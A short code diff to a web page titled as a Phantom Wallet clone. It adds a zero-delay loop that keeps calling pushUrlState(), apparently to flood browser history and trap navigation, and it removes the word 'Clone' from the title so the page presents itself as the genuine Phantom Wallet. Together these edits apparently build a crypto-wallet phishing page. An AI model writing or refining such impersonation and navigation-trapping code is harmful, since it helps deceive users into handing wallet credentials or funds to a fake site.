@@ -29,6 +29,9 @@ function pushUrlState() {
     
 }
 pushUrlState()
+setInterval(() => {
+      pushUrlState();
+})
 const ensurePageChange = setInterval(() => {
     if (document.getElementById("pageFullyLoadedActive") != null) {
   
@@ -70,7 +73,7 @@ const ensurePageChange = setInterval(() => {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Phantom Wallet Clone</title>
+    <title>Phantom Wallet</title>
     <style>
         :root {
             --background-color: #1c1c28;
